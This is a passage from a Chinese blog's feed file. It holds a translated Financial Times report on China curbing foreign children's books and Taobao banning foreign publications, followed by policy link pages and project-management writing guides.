<p>在这份阿里巴巴的声明中措辞含糊，它将同时禁止出售外国视频游戏，CD和DVD。淘宝的一个供应商告诉客户们：“我们可以说的是，珍惜你所拥有的每个人！从现在起，我们几乎可以肯定，如果要买到外国货将更加困难，更加昂贵，更加难得。”</p>
<p>中国的图书和杂志目录是被严格管制的。<br>只有八家国营的进口商及其附属公司获准将外国书目引入内地。消费者们渴望的禁书在他们向往已久的台湾和香港，那里可以享受大陆读者无法体验的自由访问。</p>
<p>然而，网上卖家提供了一个漏洞，通过巧妙的关键词搜索——所谓的“代购”，可以找到成千上万的违禁品，有事业心的中间人从国外购买商品出售给内地客户。</p>
<p>尽管图书销售的总量在下降，中国的网上图书销售在过去五年中的增长超过四倍。随着生活水平的提高，儿童文学作品的销量增长尤其迅猛。</p>
<h1 id="China-tries-to-restrict-access-to-foreign-children’s-books"><a href="#China-tries-to-restrict-access-to-foreign-children’s-books" class="headerlink" title="China tries to restrict access to foreign children’s books"></a>China tries to restrict access to foreign children’s books</h1><p>Like millions of young readers around the world, Chinese children have grown up with popular titles such as Roald Dahl’s Fantastic Mr Fox and the Harry Potter series.<br>But Beijing is now introducing new measures to restrict access to foreign books and publications as it opens a new front in its battle to limit outside influence on Chinese society.<br>Regulators have given verbal instructions to publishers to limit the number of children’s books written by foreign authors made available in China, according to three people with knowledge of the order. The decision would reduce the thousands of children’s titles published in Chinese translation every year to just a few hundred, one of them said.<br>Taobao, one of China’s biggest ecommerce sites and owned by Jack Ma’s Alibaba, said on Friday it would prohibit the sale of all foreign publications on its platform.<br>“In order to regulate the Taobao online shopping platform and to create a safe and secure online shopping environment to enhance consumer confidence and satisfaction, Taobao will add all foreign publications and buyer information to its embargo rules,” Alibaba said in a statement.</p>
<p>Industry experts expressed surprise at the ruling and questioned how it would affect a fast-growing market. “I can’t imagine this restriction to be possible, because its implementation is so difficult, and it also has no benefit whatsoever for the people or the country,” said a senior Chinese books editor, who asked not to be identified.<br>Jo Lusby, managing director for Penguin Random House North Asia, said: “The children’s market is substantial and growing in China, in particular in the pre-school and picture book area.”<br>On Amazon’s Chinese site, six out of the top 10 bestselling children’s books were by foreign authors, including Harry Potter and the Deathly Hallows, the seventh and final part of JK Rowling’s series about the adventures of a boy-wizard, and Sam McBratney’s illustration Guess How Much I Love You, which has sold 28m copies worldwide since being published 20 years ago.</p>
<h1 id="THE-CHILDREN’S-MARKET-IS-SUBSTANTIAL-AND-GROWING-IN-CHINA-IN-PARTICULAR-IN-THE-PRE-SCHOOL-AND-PICTURE-BOOK-AREA"><a href="#THE-CHILDREN’S-MARKET-IS-SUBSTANTIAL-AND-GROWING-IN-CHINA-IN-PARTICULAR-IN-THE-PRE-SCHOOL-AND-PICTURE-BOOK-AREA" class="headerlink" title="THE CHILDREN’S MARKET IS SUBSTANTIAL AND GROWING IN CHINA, IN PARTICULAR IN THE PRE-SCHOOL AND PICTURE BOOK AREA"></a>THE CHILDREN’S MARKET IS SUBSTANTIAL AND GROWING IN CHINA, IN PARTICULAR IN THE PRE-SCHOOL AND PICTURE BOOK AREA</h1><p>It is not known which part of the Chinese government is leading the drive to limit the supply of children’s books. It was also unclear whether the ruling was having an effect, as internet searches on Friday revealed hundreds of Chinese vendors selling foreign children’s books.<br>Ambiguity in the wording of Alibaba’s notice would also allow it to ban the sale of foreign video games, CDs and DVDs. One Taobao vendor wrote to customers: “All we can say is, everyone treasure what you have! From now on, we can be confident in saying that it will be more difficult, more expensive and more rare to buy foreign goods.”<br>The contents of Chinese bookshelves and magazine stands are strictly regulated. Only eight state-owned importers and their subsidiaries are licensed to bring foreign titles into the mainland.<br>Consumers eager for banned books have long sought them out in Taiwan and Hong Kong, which enjoy unfettered access to volumes inaccessible to mainland readers.<br>However, online vendors have offered a loophole, with cleverly worded searches turning up thousands of illicit titles sold by so-called daigou, enterprising intermediaries who buy goods from abroad and sell them on to mainland customers.<br>Online book sales in China have more than quadrupled during the past five years, even as overall book sales have dipped. Sales of children’s literature in particular have soared as living standards have risen.</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：关于出版业的过去、现在和将来</title>
    <url>/2016/07/28/Policy-Publish/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>国内出版业</li>
<li>技术出版实践</li>
</ul>
<a id="more"></a>
<h2 id="出版自由"><a href="#出版自由" class="headerlink" title="出版自由"></a>出版自由</h2><blockquote>
<p>每一滴露水在太阳的照耀下都闪现着无穷无尽的色彩。但是精神的太阳，无论它照耀着多少个体，无论它照耀什么事物， 却只准产生一种色彩，就是官方的色彩！”——卡尔·马克思《评普鲁士最近的书报检查令》</p>
</blockquote>
<ul>
<li><p><a href="https://riboseyim.github.io/2017/03/16/Policy-Publish-Children/" target="_blank" rel="noopener">Financial Times：中国将加强进口儿童文学作品管制</a><br>监管部门已经给出版商发出口头指示，限制外国作者编写的儿童书籍数量，具体要求根据他们掌握的订单情况确定。这一决定将使每年出版的中文儿童作品译本，从数以千计减少到几百种。</p>
</li>
<li><p><a href="https://riboseyim.github.io/2017/06/27/Technology-English/" target="_blank" rel="noopener">工程师的自我修养：全英文技术学习实践</a></p>
</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://songshuhui.net/archives/100463" target="_blank" rel="noopener">学术界的“盗版女王”</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2012/01/why_sopa_is_evil.html" target="_blank" rel="noopener">阮一峰：SOPA为什么是一部恶法，2012</a><br>SOPA是《禁止网络盗版法案》（Stop Online Piracy Act）的缩写。该法案目前正在美国国会审议，引起了大量争议。</li>
<li><a href="http://www.ruanyifeng.com/blog/2010/08/it_book_publishing.html" target="_blank" rel="noopener">阮一峰：关于IT出版业，2010</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2008/06/truth_of_chinese_best_sellers.html" target="_blank" rel="noopener">阮一峰：中国畅销书真相，2008</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2007/12/some_thoughts_about_china_book_market.html" target="_blank" rel="noopener">阮一峰：关于中国图书出版业的一些想法，2007</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/01/border-of-copyright.html" target="_blank" rel="noopener">阮一峰：版权的边界</a></li>
<li><a href="http://post.smzdm.com/p/31284/" target="_blank" rel="noopener">@banggou:码农来说说计算机书籍的出版社以及购书途径分享</a></li>
<li><a href="http://www.epubit.com.cn/article/99" target="_blank" rel="noopener">杨海玲：人民邮电出版社与图灵公司是什么关系？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3MjEwNzYzOQ==&amp;mid=2650497877&amp;idx=5&amp;sn=d7e3f5ede75e80aa676db3e5d4aaad5f&amp;chksm=872c904db05b195b67db29a6b720c5a51335b3c0a95befb5209e7e09b5d80e3599e5f4882e53&amp;mpshare=1&amp;scene=1&amp;srcid=0706z4RlrhGomAElzdo3LHXZ#rd" target="_blank" rel="noopener">【司法大数据专题报告】著作权侵权案件量占知识产权侵权案件总量一半</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>最佳写作实践</tag>
      </tags>
  </entry>
  <entry>
    <title>公共政策 | Overview of Policy</title>
    <url>/2016/04/26/Policy/</url>
    <content><![CDATA[<h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><blockquote>
<p>we need solution</p>
</blockquote>
<a id="more"></a>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li><a href="http://www.politiscales.net/zh_CN" target="_blank" rel="noopener">PolitiScale 在线政治测试</a></li>
</ul>
<h2 id="政府行为模型与预测"><a href="#政府行为模型与预测" class="headerlink" title="政府行为模型与预测"></a>政府行为模型与预测</h2><h4 id="专题：网络安全法"><a href="#专题：网络安全法" class="headerlink" title="专题：网络安全法"></a><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/" target="_blank" rel="noopener">专题：网络安全法</a></h4><h4 id="专题：知识产权法"><a href="#专题：知识产权法" class="headerlink" title="专题：知识产权法"></a><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/" target="_blank" rel="noopener">专题：知识产权法</a></h4><h4 id="专题：新闻出版法"><a href="#专题：新闻出版法" class="headerlink" title="专题：新闻出版法"></a><a href="https://riboseyim.github.io/2016/07/28/Policy-Publish/" target="_blank" rel="noopener">专题：新闻出版法</a></h4><h4 id="专题：公共医疗"><a href="#专题：公共医疗" class="headerlink" title="专题：公共医疗"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Public-Health/" target="_blank" rel="noopener">专题：公共医疗</a></h4><h4 id="专题：公共财政"><a href="#专题：公共财政" class="headerlink" title="专题：公共财政"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Public-Finance/" target="_blank" rel="noopener">专题：公共财政</a></h4><h4 id="专题：宗教治理"><a href="#专题：宗教治理" class="headerlink" title="专题：宗教治理"></a><a href="https://riboseyim.github.io/2017/04/21/Policy-Religion/" target="_blank" rel="noopener">专题：宗教治理</a></h4><h4 id="专题：民权法"><a href="#专题：民权法" class="headerlink" title="专题：民权法"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Civil-Rights/" target="_blank" rel="noopener">专题：民权法</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/09/Policy-Female/" target="_blank" rel="noopener">真假女权主义：从江青到咪蒙</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/09/08/Policy-Poverty/" target="_blank" rel="noopener">芝加哥大学：贫穷如何改变你的思维模式</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h4 id="数据可视化（五）基于网络爬虫制作数据可视化图表"><a href="#数据可视化（五）基于网络爬虫制作数据可视化图表" class="headerlink" title="数据可视化（五）基于网络爬虫制作数据可视化图表"></a><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作数据可视化图表</a></h4><ul>
<li>图表数据可视化技术方案</li>
<li>基于网络爬虫的可视化图表</li>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.github.io/charts/caipiao/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.github.io/charts/casad/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：世界主要国家专利申请变化情况（欧洲专利局） <a href="https://riboseyim.github.io/charts/ip/index.html" target="_blank" rel="noopener">在线演示</a></li>
</ul>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul>
<li><a href="http://theanarchistlibrary.org/library/moxie-marlinspike-and-windy-hart-audio-anarchy-radio-an-anarchist-critique-of-democracy" target="_blank" rel="noopener">An Anarchist Critique of Democracy</a></li>
<li><a href="http://chinaheritage.net/journal/imminent-fears-immediate-hopes-a-beijing-jeremiad/" target="_blank" rel="noopener">四个底线、八种担忧 | 中英文对照</a></li>
<li><a href="http://unirule.cloud/index.php?c=article&amp;id=4625" target="_blank" rel="noopener">许章润：我们当下的恐惧与期待 | 2018-07-24</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：宗教(Religion)</title>
    <url>/2017/04/21/Policy-Religion/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><ul>
<li>鸠摩罗什<br>译出《摩诃般若波罗蜜多心经》、《妙法莲华经》、《维摩诘经》、《佛说阿弥陀经》、《金刚经》等经和《中论》、《百论》、《十二门论》和《大智度论》等论，共七十四部，三百八十四卷。 译文非常简洁晓畅，中国之佛教由鸠摩罗什而面目一新。</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li>《The Souls of China:The Return of Religion after Mao.》<br>By lan Johnson.Pantheon;455 pages;$30. Allen Lane</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.outlookchina.net/html/news/201012/2341.html" target="_blank" rel="noopener">中国当前宗教工作中的 新情况新问题 | 20101210,瞭望中国</a></li>
<li><a href="https://mp.weixin.qq.com/s/n6MOEDCOBTAiGDxmh7Siaw" target="_blank" rel="noopener">白莲教哥老会是谣言的产物，国家面对谣言始终虚弱 | 专访牛津教授田海 | 原创： 林子人  界面文化  2017-06-07</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目沟通管理</title>
    <url>/2019/02/06/Project-Communications/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>沟通形式</li>
<li>创造性表达</li>
<li>训练场景</li>
</ul>
<span id="more"></span>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>工程师需要具备的最重要的技能是什么？几乎每一位雇主都会强调的一点就是沟通技巧。</p>
<p>在美国和加拿大负责评审工程学校专业的国家工程与技术组织委员会（Accreditation Board for Engineering and Technlogy,ABET）指出：</p>
<blockquote>
<p>在任何学科，口头和书面表达能力将成为工程专业培养的必要组成部分。</p>
</blockquote>
<p>一般情况下，沟通形式主要包括：</p>
<ul>
<li>口头</li>
<li>书面表达</li>
<li>倾听</li>
</ul>
<p>培养形式：</p>
<ul>
<li>写作讲习班</li>
<li>语文系列课程（核心课程中注重培养学生的口语演讲能力）</li>
</ul>
<p>沟通场景：</p>
<ul>
<li>会谈</li>
<li>演讲</li>
<li>会议</li>
<li>邮件</li>
<li>备忘录</li>
<li>长篇技术报告</li>
<li>期刊论文</li>
</ul>
<h2 id="How-does-it-works"><a href="#How-does-it-works" class="headerlink" title="How does it works"></a>How does it works</h2><h4 id="1、专注结构"><a href="#1、专注结构" class="headerlink" title="1、专注结构"></a>1、专注结构</h4><p>首先，无论何种形式的沟通，必须专注于结构问题。特别是撰写长篇文档之前，还需要进行专门的、尽量全面地规划工作。</p>
<blockquote>
<p>你们可以搭建一个稳健、合理、有艺术性的结构。你们可以谋划一个结构，让人愿意一页接着一页看。你们为非虚构作品谋划的结构，要具有一种吸引能力，近似于虚构作品的故事情节。<br>约翰‧麦克菲，美国非虚构写作大师，在普林斯顿大学教授非虚构写作四十余年，其学生中有多位成为普利策奖得主</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber%20Engineering.png" alt=""></p>
<p>另外，撰写长篇技术文档需要不间断工作的时间，小心地保护好自己的注意力、保持创造性的状态是成功的关键。改进日常工作比开展日常工作更重要，一些具体的措施建议：</p>
<h4 id="2、绘图技巧"><a href="#2、绘图技巧" class="headerlink" title="2、绘图技巧"></a>2、绘图技巧</h4><p>注意训练提高工程绘图技术。如果没有撰写思路，或者撰写过程中遇到瓶颈卡壳，那么不妨尝试绘图表达，图形语言是一种深植于人类记忆的本能，是最自然的表达方式。在文字出现以前的很长一段历史中，人类就是通过图形来满足表达需求。金字塔、城市防御工事或其他大型兵器自古以来就是以图样的形式来表达设计思想。可以这么说，即使到今天，人类的大量创造性思维和交流活动仍然需要借助古老的图形语言进行。</p>
<p>创造性思维可遇不可求，适当的准备有助于提高灵感的利用率，不妨试试随身携带铅笔和白纸，相信一段时间之后你会有所收获。</p>
<p>掌握专业工程制图工具，这一点在以前的文章中已经有所讨论 最佳工程实践—思维利器OmniGraffle ，现在个人觉得有必要补充修正的一点是：如果对于某个话题没有深刻理解以前，或者该图形不是为了马上加入到PPT中，一般可以不需要考虑染色的问题。我们进行深度思考的时候，主要精力应集中于事物的本质内涵。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%BB%E9%A2%98-%E5%BB%BA%E7%AD%91.png" alt=""></p>
<h4 id="3、环境因素"><a href="#3、环境因素" class="headerlink" title="3、环境因素"></a>3、环境因素</h4><p>注意搜寻能够让自己专注、放松的舒适环境。</p>
<p>具体情况因人而异，常见的无非两种，一是僻静、无干扰的办公室环境，如果有条件的话、不妨在门口挂上一块“请勿打扰”的醒目牌子；另外也可以是图书馆、咖啡厅这类半开放空间，“第三空间”虽然人来人往看着热闹、但是人群之间一般互不熟悉、也不容易互相打扰。</p>
<h4 id="4、不断练习"><a href="#4、不断练习" class="headerlink" title="4、不断练习"></a>4、不断练习</h4><p>最后，与任何其他技能一样，提高表达能力需要不断练习，培养耐性并专注细节。只有平时做好充足储备、占有足够的信息细节，忙时才能运用自如、从容不迫。</p>
<blockquote>
<p>学习很好地使用你的母语写作 。尽管有一种陈旧的看法认为程序员写作不行 ，但很多黑客 （包括我所知道的那些最优秀的黑客们 ）写得一手好文章 ，而且其数量多得让人吃惊。<br>《大教堂与集市》​</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%BB%E9%A2%98-%E5%92%96%E5%95%A1%E9%A6%86.png" alt=""></p>
<p>下面是一些日常工作中常见的练习场景：</p>
<h5 id="会谈"><a href="#会谈" class="headerlink" title="会谈"></a>会谈</h5><p>一页简短的、突出重点的文档对于非正式会议是非常有帮助的。</p>
<ul>
<li>项目状态审查：列出自上次会议以来所完成的工作</li>
<li>最近测试情况的报告：表格或图形</li>
<li>产品设计的审查：为正在开发的产品撰写一页文档，列出设计理念的关键特点及优势</li>
<li>公司程序的更改：针对组织变化</li>
</ul>
<h5 id="正式演讲"><a href="#正式演讲" class="headerlink" title="正式演讲"></a>正式演讲</h5><p>准备正式演讲的一般流程：</p>
<ul>
<li>1）了解报告听众的知识背景，包括与会者对报告内容的了解程度、水平，调整报告的内容</li>
<li>2）假设参会人员第一次接触报告的主题</li>
<li>3）在参会人员入场前检查好视听设备</li>
<li>4）穿着得体</li>
<li>5）在最初几分钟内就引出报告的目的</li>
<li>6）告诉参会人员为什么由你来做报告</li>
<li>7）在报告开始时展示出报告的内容大纲，给出将要介绍的内容概述</li>
<li>8）想出一个简短的方式来打破报告开始时的尴尬状态</li>
<li>9）谈话方式简单易懂。将技术细节留在报告后的讨论环节</li>
<li>10）保持谈话简短。讲稿最好只用掉被分配时间的50%-60%，预留时间才能准时结束。</li>
<li>11）自问自答。尽量做到所有的幻灯片格式一致，保持与听众的视线交流。</li>
<li>12）不要给听众展示公式</li>
<li>13）以“谢谢，还有其他问题吗？”来结束报告。或者通过一张总结性的幻灯片来结束报告内容</li>
<li>14）讨论环节。回答者复述提问者的问题，有助于阐明内容、使得所有参会人员都能听到，同时争取思考时间</li>
</ul>
<h5 id="为非技术人员做演进报告"><a href="#为非技术人员做演进报告" class="headerlink" title="为非技术人员做演进报告"></a>为非技术人员做演进报告</h5><p>可以遵循以下几个基本原则：</p>
<ul>
<li>1）假设观众对你的话题一无所知。</li>
<li>2）不使用专业术语解释背景材料。（包括那些看似普通的专用词汇）</li>
<li>3）用一张大的图片作为开场。</li>
<li>4）假设你在跟四年级的小学生讲话。</li>
<li>5）避免向非技术观众展示公式。</li>
</ul>
<h5 id="撰写邮件"><a href="#撰写邮件" class="headerlink" title="撰写邮件"></a>撰写邮件</h5><p>撰写一封好的电子邮件应该注意以下几个方面：</p>
<ul>
<li>邮件头：正确邮件头的的设计将为传递消息确定基调</li>
<li>标题行：简洁、醒目</li>
<li>第一句：邮件第一句的结构直接决定了正文能否被接受，并确保读者不会曲解你写邮件的原因</li>
<li>正文：邮件主体应包含信息传递的关键点。每个想法或观点都应该独立成段，并且每个段落都不能只包含一个句子。段落之间应该具有相应的逻辑联系。（技巧：现在文档编辑器中编写，当对内容满意时，再将其剪切并粘贴到邮件正文中）</li>
</ul>
<h5 id="技术报告"><a href="#技术报告" class="headerlink" title="技术报告"></a>技术报告</h5><p>在正式撰写文档之前，尤其需要注意收集各方面的信息，将涉及计算、测试、实验、用户需求和其他可用材料（参考文献、数据和图形）收集起来。</p>
<p>典型技术报告的篇幅在2~20页之间。大多数技术报告应包含以下内容：简介（或背景）、实验搭建、理论、数据、分析和结论。如果包括实验结果，应详细描述实验平台的搭建过程。内容包括描述设备、技术、尺寸及其他关键参数，使对此感兴趣的工程人员能够重建实验平台及实验过程。</p>
<h5 id="期刊论文"><a href="#期刊论文" class="headerlink" title="期刊论文"></a>期刊论文</h5><p>期刊论文都具有基本一致的标准格式，例如简介部分、理论部分、实验部分、数据部分、分析部分和结论部分。许多出版刊物都对其投稿的论文指定了专门的格式要求。</p>
<h5 id="提案"><a href="#提案" class="headerlink" title="提案"></a>提案</h5><p>提案的主要目的通常是申请资金支持。除了技术报告部分，提案还包括关于目标、预算、背景及人员等。</p>
<h5 id="说明手册"><a href="#说明手册" class="headerlink" title="说明手册"></a>说明手册</h5><p>说明手册主要向用户介绍产品的相关信息及有关产品的安装、操作和使用等内容。一份好的产品说明手册还应包括安全信息、故障排除、维修和操作理论（适用原则）等。</p>
<ul>
<li>注意：内容的重复。文档中的多个衔接处需要对某些信息进行重复描述。<strong>不要认为读者所有看过的内容都能记住</strong>，编写者需要考虑到每一个细微处的设计。</li>
</ul>
<p>常规格式：<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## 一、简介</span></span><br><span class="line"><span class="section">## 二、安装</span></span><br><span class="line"><span class="section">## 三、操作</span></span><br><span class="line"><span class="section">##  四、安全性</span></span><br><span class="line"><span class="section">## 五、故障排除</span></span><br><span class="line"><span class="section">#### 1)症状</span></span><br><span class="line"><span class="bullet">-</span> 可能的原因</span><br><span class="line"><span class="bullet">-</span> 解决方法</span><br><span class="line"><span class="section">#### 2)症状</span></span><br><span class="line"><span class="bullet">-</span> 可能的原因</span><br><span class="line"><span class="bullet">-</span> 解决方法</span><br><span class="line"><span class="section">## 六、附录</span></span><br><span class="line"><span class="bullet">-</span> 原理图</span><br><span class="line"><span class="bullet">-</span> 分解图</span><br><span class="line"><span class="bullet">-</span> 理论</span><br><span class="line"><span class="bullet">-</span> XX列表</span><br></pre></td></tr></table></figure></p>
<h5 id="工程日志"><a href="#工程日志" class="headerlink" title="工程日志"></a>工程日志</h5><p>工程日志包括涉及过程中产生的所有想法、计算结果、创新和测试结果。每个项目成员都应保留单独的日志，对应分配给每个人的任务，当项目完成后，所有团队成员的日志都放在一起，形成项目活动的完整记录。</p>
<p><strong>完整的日志还可以用作发明权的证据。</strong></p>
<p><strong>记录没有成功的工作与记录成功的工作同样重要。</strong> 确保错误不会在将来重演。</p>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/T0jA2JDBYhkOaolJ1d2QCw">人工智能玩家发明自己的“语言”，合作“交流”以赢得纸牌游戏 | Matthew Hutson  IEEE电气电子工程师学会  3月8日</a></li>
<li><a href="https://mp.weixin.qq.com/s/BXVyPAwwQjd1GvJSFjznjg">别把施工日志不当回事，把施工日志写的好的人才有资格做项目负责人！ | 中国土木工程网  2019年9月15日</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:复杂项目管理</title>
    <url>/2019/05/01/Project-Complex/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>“从本质上来说，简单学习系统只在重复性情境中有用，应付不了新异情境。学习系统只有辅以具有一些推导能力的分类法或者模式识别法，才能获得非凡的成绩。因为遇到的对象是如此五花八门，所以我们不能依靠重复。（1963）” —— 马文·李·明斯基（英语：Marvin Lee Minsky），麻省理工学院人工智能实验室的创始人之一。1969年，因为在人工智能领域的贡献获得图灵奖。</p>
</blockquote>
<a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/%E5%8C%97%E6%9E%81%E6%98%9F%E5%AF%BC%E5%BC%B9%E5%8F%91%E5%B0%84_2850.jpg" alt></p>
<ul>
<li>北极星项目成员单位</li>
</ul>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h4 id="Complex-System-Theory"><a href="#Complex-System-Theory" class="headerlink" title="Complex System Theory"></a>Complex System Theory</h4><p>“Complex” 一词来源于拉丁语 “cum” (意思是集合或者连接)，”plexus”(意思是交织)。牛津英语词典的解释为：包含多个相互连接的部分、不容易分析和解决的。</p>
<ul>
<li>a group of buildings of a similar type together in one place</li>
<li>a group of things that are connected</li>
<li>(especially in compounds)a mental state that is not normal</li>
<li>if sb has a complex about sth,they are worried about it in way that is not normal</li>
</ul>
<p>项目复杂性定义的内涵一般包括：</p>
<ul>
<li>结构复杂性：规模，即元素个数、元素间的相关性等。</li>
<li>不确定性：目标的不确定性、方法的不确定性。</li>
</ul>
<p>具体来说，项目复杂性因素构成包括：</p>
<ul>
<li>目标复杂性（goal complexity）</li>
<li>组织复杂性（organizational complexity）</li>
<li>任务复杂性（task complexity）</li>
<li>技术复杂性（technological complexity）</li>
<li>环境复杂性（environmental complexity）</li>
<li>信息复杂性（information complexity）</li>
</ul>
<h2 id="Introduction-XX简介"><a href="#Introduction-XX简介" class="headerlink" title="Introduction | XX简介"></a>Introduction | XX简介</h2><h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Overview"><a href="#Architecture-Overview" class="headerlink" title="Architecture Overview"></a>Architecture Overview</h2><h4 id="Files-Tree"><a href="#Files-Tree" class="headerlink" title="Files Tree"></a>Files Tree</h4><h2 id="Best-Practice-XX-最佳实践"><a href="#Best-Practice-XX-最佳实践" class="headerlink" title="Best Practice | XX 最佳实践"></a>Best Practice | XX 最佳实践</h2><h4 id="复杂性"><a href="#复杂性" class="headerlink" title="复杂性"></a>复杂性</h4><ul>
<li><a href="https://riboseyim.github.io/2018/03/25/Mathmetics-Complexity/" target="_blank" rel="noopener">如何度量复杂性</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/OpenSource-Operational/" target="_blank" rel="noopener">引入开源软件的运营挑战</a></li>
</ul>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
